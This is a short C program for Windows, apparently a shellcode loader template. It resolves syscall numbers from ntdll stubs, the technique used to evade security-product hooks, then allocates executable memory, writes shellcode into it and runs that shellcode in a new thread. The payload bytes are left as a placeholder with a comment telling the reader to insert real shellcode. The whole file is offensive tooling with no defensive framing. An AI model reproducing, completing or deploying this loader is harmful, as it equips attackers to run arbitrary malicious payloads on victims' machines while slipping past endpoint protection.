#include <windows.h>  
#include <stdio.h>    
#include "syscalls.h" 

// Declare global variables to hold syscall numbers
DWORD wNtAllocateVirtualMemory;
DWORD wNtWriteVirtualMemory;
DWORD wNtCreateThreadEx;
DWORD wNtWaitForSingleObject;

int main() {
    PVOID allocBuffer = NULL;  // Declare a pointer to the buffer to be allocated
    SIZE_T buffSize = 0x1000;  // Declare the size of the buffer (4096 bytes)

    // Get a handle to the ntdll.dll library
    HANDLE hNtdll = GetModuleHandleA("ntdll.dll");

    // Declare and initialize a pointer to the NtAllocateVirtualMemory function and get the address of the NtAllocateVirtualMemory function in the ntdll.dll module
    UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    // Read the syscall number from the NtAllocateVirtualMemory function in ntdll.dll
    // This is typically located at the 4th byte of the function
    wNtAllocateVirtualMemory = ((unsigned char*)(pNtAllocateVirtualMemory + 4))[0];

    UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    wNtWriteVirtualMemory = ((unsigned char*)(pNtWriteVirtualMemory + 4))[0];

    UINT_PTR pNtCreateThreadEx = (UINT_PTR)GetProcAddress(hNtdll, "NtCreateThreadEx");
    wNtCreateThreadEx = ((unsigned char*)(pNtCreateThreadEx + 4))[0];

    UINT_PTR pNtWaitForSingleObject = (UINT_PTR)GetProcAddress(hNtdll, "NtWaitForSingleObject");
    wNtWaitForSingleObject = ((unsigned char*)(pNtWaitForSingleObject + 4))[0];


    // Replace this with your actual shellcode
    unsigned char shellcode[] = "\xfc\x48\x83...";


    // Use the NtAllocateVirtualMemory function to allocate memory for the shellcode
    NtAllocateVirtualMemory((HANDLE)-1, (PVOID*)&allocBuffer, (ULONG_PTR)0, &buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    
    ULONG bytesWritten;
    // Use the NtWriteVirtualMemory function to write the shellcode into the allocated memory
    NtWriteVirtualMemory(GetCurrentProcess(), allocBuffer, shellcode, sizeof(shellcode), &bytesWritten);

    HANDLE hThread;
    // Use the NtCreateThreadEx function to create a new thread that starts executing the shellcode
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)allocBuffer, NULL, FALSE, 0, 0, 0, NULL);

    // Use the NtWaitForSingleObject function to wait for the new thread to finish executing
    NtWaitForSingleObject(hThread, FALSE, NULL);
}
